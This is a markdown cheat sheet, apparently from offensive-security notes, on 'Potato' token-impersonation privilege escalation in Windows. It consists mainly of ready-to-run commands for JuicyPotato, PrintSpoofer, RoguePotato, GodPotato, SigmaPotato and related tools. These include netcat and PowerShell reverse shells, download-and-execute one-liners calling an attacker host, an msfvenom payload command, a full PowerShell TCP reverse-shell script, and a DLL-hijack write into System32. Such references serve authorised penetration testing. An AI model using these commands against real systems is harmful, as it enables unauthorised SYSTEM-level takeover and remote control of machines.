# Potato Privilege Escalation

## Table of Contents

- [Overview](#overview)
- [JuicyPotato](#juicypotato)
- [PrintSpoofer](#printspoofer)
- [RoguePotato](#roguepotato)
- [SweetPotato](#sweetpotato)
- [GodPotato](#godpotato)
- [SharpEfsPotato](#sharpefspotato)
- [LocalPotato](#localpotato)
- [CoercedPotato](#coercedpotato)
- [SigmaPotato](#sigmapotato)
- [Quick Reference](#quick-reference)

---

## Overview

"Potato" exploits abuse Windows privilege escalation via token impersonation. They require `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

### Check Privileges

```cmd
whoami /priv
```

Look for:

- `SeImpersonatePrivilege` - Enabled
- `SeAssignPrimaryTokenPrivilege` - Enabled

### Common Service Accounts with Privileges

- IIS AppPool accounts
- SQL Server service accounts
- Network Service
- Local Service

---

## JuicyPotato

**Works on:** Windows Server 2008-2019, Windows 7-10 (not Server 2019/Win10 1809+)

### Basic Usage

> Execute command as SYSTEM

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt" -t *
```

> Reverse shell

```cmd
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -e $base64_payload" -t *
```

> With specific CLSID

```cmd
JuicyPotato.exe -l 1337 -c {CLSID} -p c:\windows\system32\cmd.exe -a "/c whoami" -t *
```

### Common CLSIDs

| CLSID | Service |
| :--- | :--- |
| {4991d34b-80a1-4291-83b6-3328366b9097} | BITS |
| {e60687f7-01a1-40aa-86ac-db1cbf673334} | WUAUSERV |
| {752073a1-23f2-4396-85f0-8fdb879ed0ed} | SENS |

> Find working CLSID

```powershell
# Download CLSID test script
IEX(IWR https://raw.githubusercontent.com/ohpe/juicy-potato/master/CLSID/GetCLSID.ps1)
```

---

## PrintSpoofer

**Works on:** Windows 10, Server 2016, Server 2019

### PrintSpoofer Basic Usage

> Interactive SYSTEM shell

```cmd
PrintSpoofer.exe -i -c cmd.exe
```

> Execute command

```cmd
PrintSpoofer.exe -c "whoami > C:\output.txt"
```

> Reverse shell with nc

```cmd
PrintSpoofer.exe -c "c:\temp\nc.exe $lhost $lport -e cmd.exe"
```

> PowerShell reverse shell

```cmd
PrintSpoofer.exe -c "powershell -e $base64_payload"
```

---

## RoguePotato

**Works on:** Windows 10 1809+, Server 2019

Requires attacker machine to act as OXID resolver.

### Setup OXID Resolver (Attacker Machine)

> Run socat forwarder

```shell
socat tcp-listen:135,reuseaddr,fork tcp:$rhost:9999
```

### Execute on Target

> Basic usage

```cmd
RoguePotato.exe -r $lhost -e "cmd.exe /c whoami > C:\output.txt" -l 9999
```

> Reverse shell

```cmd
RoguePotato.exe -r $lhost -e "c:\temp\nc.exe $lhost $lport -e cmd.exe" -l 9999
```

---

## SweetPotato

**Works on:** Multiple Windows versions (combined techniques)

### SweetPotato Basic Usage

> Interactive shell

```cmd
SweetPotato.exe -e EfsRpc -p c:\windows\system32\cmd.exe
```

> With arguments

```cmd
SweetPotato.exe -e PrintSpoofer -p c:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt"
```

### Available Exploits (-e)

| Option | Technique |
| :--- | :--- |
| EfsRpc | EFS RPC abuse |
| PrintSpoofer | Named pipe impersonation |
| WinRM | WinRM service abuse |

---

## GodPotato

**Works on:** Windows Server 2012-2022, Windows 8-11

### GodPotato Basic Usage

> Execute command

```cmd
GodPotato.exe -cmd "cmd /c whoami"
```

> Reverse shell

```cmd
GodPotato.exe -cmd "nc.exe -e cmd.exe $lhost $lport"
```

> PowerShell download and execute

```cmd
GodPotato.exe -cmd "powershell IEX(IWR http://$lhost/shell.ps1)"
```

### .NET Version

```cmd
GodPotato-NET4.exe -cmd "cmd /c whoami"
GodPotato-NET2.exe -cmd "cmd /c whoami"
GodPotato-NET35.exe -cmd "cmd /c whoami"
```

---

## SharpEfsPotato

**Works on:** Windows 10, Server 2016-2019

### SharpEfsPotato Basic Usage

> Execute command

```cmd
SharpEfsPotato.exe -p c:\windows\system32\cmd.exe -a "/c whoami > C:\output.txt"
```

> Interactive shell

```cmd
SharpEfsPotato.exe -p c:\windows\system32\cmd.exe
```

---

## LocalPotato

**Works on:** Windows 10/11, Server 2019/2022

Abuses NTLM local authentication for privilege escalation.

### LocalPotato Basic Usage

> Copy file as SYSTEM

```cmd
LocalPotato.exe -i c:\temp\payload.dll -o c:\windows\system32\evil.dll
```

### Combine with DLL Hijacking

```cmd
# 1. Find writable DLL hijack location
# 2. Use LocalPotato to write DLL
LocalPotato.exe -i c:\temp\malicious.dll -o "C:\Program Files\VulnApp\hijack.dll"

# 3. Trigger vulnerable application
```

---

## CoercedPotato

**Works on:** Combines multiple coercion techniques

### CoercedPotato Basic Usage

> Execute command

```cmd
CoercedPotato.exe --revshell $lhost $lport
```

> Custom command

```cmd
CoercedPotato.exe --cmd "cmd /c whoami"
```

---

## SigmaPotato

**Works on:** Windows 10/11, Server 2016-2022 (universal potato exploit)

### SigmaPotato Overview

SigmaPotato combines multiple token impersonation techniques into a single tool, providing a universal solution.

### SigmaPotato Basic Usage

> Execute command as SYSTEM

```cmd
SigmaPotato.exe "cmd /c whoami"
```

> Reverse shell

```cmd
SigmaPotato.exe "nc.exe $lhost $lport -e cmd.exe"
```

> PowerShell download and execute

```cmd
SigmaPotato.exe "powershell -ep bypass IEX(IWR http://$lhost/shell.ps1)"
```

### Download

- **GitHub**: <https://github.com/tylerdotrar/SigmaPotato>

---

## Quick Reference

### Selection Guide

| Windows Version | Recommended Tool |
| :--- | :--- |
| Windows 7 / Server 2008 | JuicyPotato |
| Windows 10 (< 1809) | JuicyPotato |
| Windows 10 (â‰¥ 1809) | PrintSpoofer, SweetPotato, GodPotato, SigmaPotato |
| Windows 11 | GodPotato, SigmaPotato |
| Server 2016 | PrintSpoofer, SweetPotato, SigmaPotato |
| Server 2019 | RoguePotato, PrintSpoofer, GodPotato, SigmaPotato |
| Server 2022 | GodPotato, SigmaPotato |

### Quick Commands

| Tool | Command |
| :--- | :--- |
| JuicyPotato | `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c $cmd" -t *` |
| PrintSpoofer | `PrintSpoofer.exe -c "cmd.exe"` |
| RoguePotato | `RoguePotato.exe -r $lhost -e "cmd.exe" -l 9999` |
| SweetPotato | `SweetPotato.exe -e EfsRpc -p cmd.exe` |
| GodPotato | `GodPotato.exe -cmd "cmd /c $cmd"` |
| SigmaPotato | `SigmaPotato.exe "cmd /c $cmd"` |

### Download Links

| Tool | URL |
| :--- | :--- |
| JuicyPotato | <https://github.com/ohpe/juicy-potato> |
| PrintSpoofer | <https://github.com/itm4n/PrintSpoofer> |
| RoguePotato | <https://github.com/antonioCoco/RoguePotato> |
| SweetPotato | <https://github.com/CCob/SweetPotato> |
| GodPotato | <https://github.com/BeichenDream/GodPotato> |
| SharpEfsPotato | <https://github.com/bugch3ck/SharpEfsPotato> |
| SigmaPotato | <https://github.com/tylerdotrar/SigmaPotato> |

### Reverse Shell Payload Generation

> MSFvenom exe

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o shell.exe
```

> PowerShell Base64

```shell
# Generate reverse shell
$command = '$client = New-Object System.Net.Sockets.TCPClient("$lhost",$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

# Base64 encode
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
```

---

## ðŸ“š See Also

### Related Privilege Escalation

- **[Privilege Escalation Windows](4.1.Privilege-Escalation-Windows.md)** - Complete Windows privesc methodology
- **[LOLBAS Windows](4.4.LOLBAS-Windows.md)** - Native Windows binary abuse
- **[Windows PrivEsc Tools](4.6.Windows-PrivEsc-Tools.md)** - RunasCs, Seatbelt, SharpUp

### Related Topics

- **[Reverse Shell](../6.OS-Command/6.3.Reverse-Shell.md)** - Msfvenom payloads for Potato exploits
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Post-SYSTEM exploitation
